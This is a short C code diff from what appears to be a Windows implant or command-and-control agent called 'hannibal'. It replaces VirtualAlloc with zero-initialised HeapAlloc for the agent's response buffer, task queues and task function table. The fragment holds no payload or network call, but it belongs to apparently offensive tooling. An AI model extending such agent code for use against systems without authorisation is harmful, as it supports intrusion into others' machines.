@@ -17,7 +17,7 @@ SECTION_CODE void hannibal_response(LPCWSTR message, LPCSTR task_uuid)
     HANNIBAL_INSTANCE_PTR
 
     size_t msg_size = pic_strlenW(message)*sizeof(WCHAR) + 2;
-    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, msg_size, MEM_COMMIT, PAGE_READWRITE);
+    WCHAR *response_content = (WCHAR *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, msg_size);
 
     for (int i = 0; i < msg_size; i++) {
         response_content[i] = message[i];
@@ -41,7 +41,7 @@ SECTION_CODE BOOL init_task_queue(TASK_QUEUE *queue_ptr, int capacity)
     
     queue_ptr->capacity = capacity;
     // Doesn't get freed. Queue stays for lifetime of agent
-    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK) * queue_ptr->capacity, MEM_COMMIT, PAGE_READWRITE);
+    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK) * queue_ptr->capacity);
 
     if (queue_ptr->queue_ptr == NULL){
         return FALSE;
@@ -61,7 +61,7 @@ SECTION_CODE BOOL init_task_response_queue(TASK_QUEUE *queue_ptr, int capacity)
     
     queue_ptr->capacity = capacity;
     // Doesn't get freed. Queue stays for lifetime of agent
-    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(TASK) * queue_ptr->capacity, MEM_COMMIT, PAGE_READWRITE);
+    queue_ptr->queue_ptr = (TASK *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK) * queue_ptr->capacity);
 
     if (queue_ptr->queue_ptr == NULL){
         return FALSE;
@@ -168,7 +168,7 @@ SECTION_CODE void init_task_ptrs()
     };
 
     hannibal_instance_ptr->tasks.task_func_ptrs_size = sizeof(task_ptrs)/sizeof(TASK_ENTRY);
-    hannibal_instance_ptr->tasks.task_func_ptrs = (TASK_ENTRY *)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, sizeof(task_ptrs), MEM_COMMIT, PAGE_READWRITE); // Doesn't get freed. Stays for lifetime of agent
+    hannibal_instance_ptr->tasks.task_func_ptrs = (TASK_ENTRY *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(task_ptrs)); // Doesn't get freed. Stays for lifetime of agent
 
      if(hannibal_instance_ptr->tasks.task_func_ptrs == NULL){
         return 1;
